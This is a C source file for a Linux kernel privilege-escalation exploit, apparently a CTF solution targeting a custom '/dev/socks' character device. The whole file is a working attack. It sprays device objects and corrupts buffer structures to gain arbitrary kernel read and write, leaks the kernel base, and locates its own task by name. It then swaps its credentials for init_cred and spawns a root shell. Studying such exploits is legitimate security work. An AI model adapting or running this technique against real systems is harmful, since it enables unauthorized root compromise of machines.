#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <string.h>
#include <errno.h>
#include  <sys/types.h>
#include  <sys/ipc.h>
#include  <sys/shm.h>
#include  <stdio.h>
#include <sys/prctl.h>

#include "socks.h"


/*
 * Uncomment this define to use the shmem leak instead of the 
 * seq_file one. You can also use -DUSE_SHMEM_LEAK when compiling
 * the code instead.
 */

// #define USE_SHMEM_LEAK

typedef struct sock_buf {
	size_t size;
	unsigned char *buffer;
	size_t read_index;
	size_t write_index;
	// Inline buffer!
} sock_buf_t;

static char *ptr = NULL;
int spray_fd[1000];
int fds[4];

int sock_init(int fd, size_t size) {
	return ioctl(fd, IOCTL_SOCKS_INIT, size);
}

int sock_listen(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to listen in %s\n", param.name);

	return ioctl(fd, IOCTL_SOCKS_LISTEN, &param);
}

int sock_connect(int fd, char *name) {
	struct sock_name_param param;
	memset(&param, 0, sizeof(param));
	strncpy(param.name, name, sizeof(param.name) -1);
	printf("[*] Trying to connect to %s\n", param.name);
	return ioctl(fd, IOCTL_SOCKS_CONNECT, &param);
}

int sock_send(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_SEND, &param);
}

int sock_recv(int fd, void *buffer, size_t size) {
	struct sock_buffer_param param = { .size = size, .buffer = buffer};
	return ioctl(fd, IOCTL_SOCKS_RECV, &param);
}

/*
 * init_task offset from the base of the kernel. Obtained by subtracting 
 * init_task - _stext, which can be read off /proc/kallsyms.
 */

#define INIT_TASK 0x100f740L

/* shm_vm_ops  offset from the kernel base. */
#define SHMEM_VM_OPS 0x1056b00

/* single_start  offset from the kernel base. */
#define SINGLE_START 0x1c1fd0

/*
 * Offsets in the task structure. Obtained by dumping a valid cred 
 * structure and heuristically checking for them.
 */

#define COMM 0x570
#define CRED 0x560
#define TASKS 0x2c8

/*
 * Read function. First forges a sock_buf_t with the 
 * given addr and 8 bytes available to be read, then 
 * performs the read.
 */

uint64_t read64(uint64_t addr) {
	*((uint64_t *) (ptr + 0xfe0)) = 8;
	*((uint64_t *) (ptr + 0xfe8)) = addr;
	*((uint64_t *) (ptr + 0xff0)) = 0;
	*((uint64_t *) (ptr + 0xff8)) = 8;

	uint64_t data;
	int ret = sock_send(fds[0], ptr + 0xfe0, 0x21);
	// printf("[*] ioctl returned %d, errno = %d\n", ret, errno);
	sock_recv(fds[2], (char *) &data, 8);

	return data;
}


/*
 * Write function. First forges a sock_buf_t with the 
 * given addr and 8 bytes available to be written, then 
 * performs the write.
 */
uint64_t write64(uint64_t addr, uint64_t value) {
	*((uint64_t *) (ptr + 0xfe0)) = 8;
	*((uint64_t *) (ptr + 0xfe8)) = addr;
	*((uint64_t *) (ptr + 0xff0)) = 0;
	*((uint64_t *) (ptr + 0xff8)) = 0;

	uint64_t data = value;
	int ret = sock_send(fds[0], ptr + 0xfe0, 0x21);

	sock_send(fds[3], (char *) &data, 8);

	return data;
}

/*
 * Initial leak obtained by sending data to a sock_buf_t
 * to setup its `write_index` correctly, then smashing 
 * the LSB of its pointer to read out of bounds.
 * 
 * Returns the address of a sock_buf_t located at the 256-byte
 * aligned address before the fds[2] sock_buf_t.
 */
uint64_t leak(void) {
  int ret;
  *((uint64_t *) (ptr + 0xff8)) = 8;

  /* Make sure there are 0x20 bytes available to be read */
  char buf[0x20] = { [0 ... 0x1f] = 'A' };
  ret = sock_send(fds[3], buf, 0x20);
  
  /* Smash `size` and set LSB of buffer to 0x00 */
  ret = sock_send(fds[0], ptr + 0xff8, 9);

  /* Read 0x20 bytes from modified buffer pointer */
  ret = sock_recv(fds[2], buf, 0x20);
  return *((uint64_t *) (buf + 8));
}

int main(int argc, char* argv[argc+1]) {

#ifdef USE_SHMEM_LEAK
	int       shm_id;
	key_t     mem_key;
	int       *shm_ptr;

	shm_id = shmget(mem_key, 4*sizeof(int), IPC_CREAT | 0666);
	if (shm_id < 0) {
	     printf("*** shmget error (server) ***\n");
	     exit(1);
	}
#endif


	for (size_t i = 0; i < 1000; ++i) {
		int fd = open("/dev/socks", O_RDWR);
		sock_init(fd, -1);
		spray_fd[i] = fd;
	}

	for (size_t i = 0; i < 4; ++i) {
		fds[i] = open("/dev/socks", O_RDWR);
		if (fds[i] == -1)
			perror("open()");

		printf("[+] Intializing socket: %d\n", fds[i]);
		sock_init(fds[i], ULONG_MAX);
	}
	
	sock_listen(fds[0],  "socks");
	sock_connect(fds[1], "socks");

	sock_listen(fds[2],  "socks2");
	sock_connect(fds[3], "socks2");

	ptr = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	int ret1 = mprotect(ptr + 0x1000, 0x1000, PROT_NONE);

	uint64_t addr = leak();

	uint64_t fds3 = 0;

	for(int i=0; i < 256; i+= 8) {
		uint64_t data = read64(addr + i);
		if (data == 0x4141414141414100) {
			/* found fds[3] ! */
			fds3 = addr + i;
		}
	}

	if (!fds3) {
		printf("[!] Failed to find fds[3]\n");
		exit(0);
	}

	printf("[*] fds[3] sock_buf_t at %lx\n", fds3);
	uint64_t target = fds3 - 4*0x20;

	/*
	 * Alright we've got a leak, let's find out where the kernel is.
	 */

	/* Close spray_fd[999] and replace it by a shm_file_data */

	close(spray_fd[999]);

#ifndef USE_SHMEM_LEAK
	int fdx = open("/proc/self/stat", O_RDONLY);

	uint64_t single_start = read64(target);
	uint64_t kbase = single_start - SINGLE_START;
	printf("[*] Kernel base: 0x%lx\n", kbase);

#else 

	shm_ptr = (int *) shmat(shm_id, NULL, 0);  /* attach */
	if ((int) shm_ptr == -1) {
	     printf("*** shmat error (server) ***\n");
	     exit(1);
	}

	
	
	uint64_t shmem_vm_ops = read64(target+8);
	uint64_t init_ipc_ns = read64(target+24);

	uint64_t kbase = shmem_vm_ops - SHMEM_VM_OPS;
	printf("[*] Kernel base: 0x%lx\n", kbase);
#endif 

	/* Change our name to pwnypwny */
	prctl(PR_SET_NAME,"pwnypwny",NULL,NULL,NULL);

	char buf[17] = {0};

	/* Extract init_cred from init_task */
	uint64_t init_task = kbase + INIT_TASK;
	uint64_t init_cred = read64(init_task + CRED);

	/* Find our task by name.  */
	uint64_t current = init_task;

	do {
		*(uint64_t *)&buf[0] = read64(current + COMM);
		*(uint64_t *)&buf[8] = read64(current + COMM + 8);

		if (strcmp(buf, "pwnypwny") == 0) {
			break;
		}

		current = read64(current + TASKS) - TASKS;
	} while (current != init_task);


	if (current == init_task ) {
		printf("[*] Failed to find ourselves...\n");
		exit(0);
	}


	/*
	 * Replace our creds by those of init. We read the first qword 
	 * and increment it by 10. This increases the cred refcount by 
	 * 10, making sure we don't cause a use-after-free when the exploit
	 * process exits.
	 */
	uint64_t init_cred_qw0 = read64(init_cred);
	write64(init_cred, init_cred_qw0 + 10);

	write64(current + CRED, init_cred);
	write64(current + CRED + 8, init_cred);


	printf("[*] We are: %d\n", getuid());

	char *args[] = {"/bin/sh", NULL};
	execve("/bin/sh", args, NULL);

	return 0;
}
